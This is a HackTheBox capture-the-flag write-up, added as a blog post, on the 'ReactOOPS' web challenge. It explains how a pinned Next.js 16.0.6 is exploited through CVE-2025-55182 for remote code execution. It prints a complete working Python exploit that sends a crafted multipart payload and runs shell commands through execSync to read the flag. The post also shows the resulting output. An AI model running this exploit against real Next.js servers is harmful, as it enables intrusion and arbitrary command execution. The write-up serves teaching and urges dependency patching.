@@ -1,0 +1,113 @@
+---
+title: "HTB Web | ReactOOPS: a static UI hiding an RCE"
+description: "A static Next.js interface with no inputs and no obvious attack surface. The vulnerability was in the framework itself."
+date: 2026-04-30
+tags: [ctf, web, nextjs, cve, rce]
+platform: HackTheBox
+difficulty: easy
+category: Web
+retired: true
+draft: false
+---
+
+## Overview
+
+**Platform:** HackTheBox  
+**Category:** Web  
+**Difficulty:** Very Easy  
+**Status:** Retired
+
+ReactOOPS presents a polished AI assistant landing page. No login form, no search bar, no file upload. The scenario hints at user input shaping the system in unexpected ways, which is confusing at first since there is no user input anywhere on the page. That turns out to be exactly the point.
+
+## Recon
+
+Opening the source zip provided with the challenge is the natural starting point. The Dockerfile tells a lot right away:
+
+```dockerfile
+COPY challenge/flag.txt /app/flag.txt
+RUN mkdir /app/public
+RUN cp -r public .next/standalone/public
+```
+
+The Dockerfile copies the flag to `/app/flag.txt`, one level above the public directory the Next.js standalone server serves. Path traversal through `/_next/static/` comes to mind, but Next.js normalizes paths before serving static files, so that goes nowhere.
+
+Looking at `package.json` reveals a more interesting lead:
+
+```json
+{
+  "name": "react2shell",
+  "dependencies": {
+    "next": "16.0.6",
+    "react": "^19",
+    "react-dom": "^19"
+  }
+}
+```
+
+The project is named `react2shell`. And `next: 16.0.6` is a specific version worth searching for. A quick search for `Next.js 16.0.6 CVE` turns up [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182): an RCE vulnerability in Next.js Server Functions via prototype pollution in the React Flight Protocol.
+
+## The vulnerability: CVE-2025-55182
+
+[CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) is an RCE vulnerability in Next.js Server Functions, originally discovered by [Lachlan Davidson](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc). The root cause is prototype pollution in the React Flight Protocol during deserialization of Server Action requests. Setting the header `Next-Action: foo` is enough to trigger it, no valid Server Action needed, and it fires before any validation runs.
+
+In OWASP terms this is A06:2021 - Vulnerable and Outdated Components. No inputs to sanitize, no logic to bypass. The vulnerability lives entirely in the framework version.
+
+## Exploitation
+
+The exploit sends a POST to `/` with the `Next-Action` header and a crafted multipart payload. The payload injects a fake chunk with `status: "resolved_model"`, which triggers `initializeModelChunk`. Controlled fields in `_response` then redirect deserialization to call the `Function` constructor with attacker-supplied code.
+
+Based on the [PoC by msanft](https://github.com/msanft/CVE-2025-55182/tree/main), the adapted payload to read the flag:
+
+```python
+import requests
+import json
+
+url = "http://154.57.X.X:PORT/"
+
+cmd = "cat /app/flag.txt"
+prefix = (
+    f"var res = process.mainModule.require('child_process')"
+    f".execSync('{cmd}',{{'timeout':5000}}).toString().trim();"
+    f" throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}}); // "
+)
+
+crafted_chunk = {
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": '{"then": "$B0"}',
+    "_response": {
+        "_prefix": prefix,
+        "_formData": {
+            "get": "$1:constructor:constructor",
+        },
+    },
+}
+
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"'),
+}
+
+headers = {
+    "Next-Action": "foo",
+}
+
+response = requests.post(url, files=files, headers=headers)
+print(response.text)
+```
+
+The only change from the original PoC is the command inside `execSync`. The output does not come back in the response body directly. It gets exfiltrated via the digest of a thrown `NEXT_REDIRECT` error, which Next.js surfaces in the response. Running the script against the target returns the flag in that digest field:
+
+```
+$ python3 exploit.py
+
+0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
+1:E{"digest":"HTB{[REDACTED]}"}
+```
+
+## Takeaway
+
+A web application with no user-facing inputs is not necessarily safe. There was nothing to sanitize in this UI, no forms, no search, no file uploads. The attack surface was the Next.js version pinned in `package.json`.
+
+This is what OWASP A06 looks like in practice. CVE-2025-55182 carries a CVSS v3 score of 10.0, the maximum. The window of exposure depends entirely on how quickly the framework gets updated. `npm audit` and dependency alerts are not noise. They are the attack surface.
